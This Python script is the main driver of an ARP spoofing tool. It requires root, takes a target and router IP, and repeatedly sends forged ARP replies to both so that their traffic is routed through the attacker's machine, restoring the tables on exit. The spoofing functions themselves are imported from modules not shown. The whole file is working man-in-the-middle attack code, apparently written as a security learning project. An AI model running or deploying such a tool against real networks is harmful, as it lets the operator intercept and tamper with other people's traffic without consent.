#!/usr/bin/env python
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                                                                          ║
# ║             ███╗   ███╗ █████╗  ██╗██╗      ██████╗  ██████╗             ║
# ║             ████╗ ████║██╔══██╗███║██║     ██╔═══██╗██╔════╝             ║
# ║             ██╔████╔██║███████║╚██║██║     ██║   ██║██║                  ║
# ║             ██║╚██╔╝██║██╔══██║ ██║██║     ██║   ██║██║                  ║
# ║             ██║ ╚═╝ ██║██║  ██║ ██║███████╗╚██████╔╝╚██████╗             ║
# ║             ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═╝╚══════╝ ╚═════╝  ╚═════╝             ║
# ║                                                                          ║
# ║    Project: arp_spoofing v1.0.0                                          ║
# ║    Created: 2025-05-22                                                   ║
# ║    Author: ma1loc (youness anflous)                                      ║
# ║                                                                          ║
# ╚══════════════════════════════════════════════════════════════════════════╝
# arp_spoofing.py

import	sys
import	time
from	arp import spoof, arp_restore
from	rgb_msg import s_print, e_print
from	arp_utils import is_root
from	arg_parsing import arg_parsing, is_valid_ip

def main():
    is_root()
    args = arg_parsing()
    if not is_valid_ip(args.target) or not is_valid_ip(args.router):
        e_print("[-] IPs format not valid.", newline=True)
        sys.exit(1)

    try:
        packets_send = 1
        while True:
            spoof(args.target, args.router)
            s_print(f"\r[+] packet_send -> {packets_send}", newline=False)
            sys.stdout.flush()
            packets_send += 1
            spoof(args.router, args.target)
            s_print(f"\r[+] packet_send -> {packets_send}", newline=False)
            sys.stdout.flush()
            packets_send += 1
            time.sleep(2)
    except KeyboardInterrupt:
        s_print("\n[*] Restoring network...", newline=True)
        arp_restore(args.target, args.router)
        arp_restore(args.router, args.target)
        s_print("[+] Quit", newline=True)

if __name__ == "__main__":
    main()
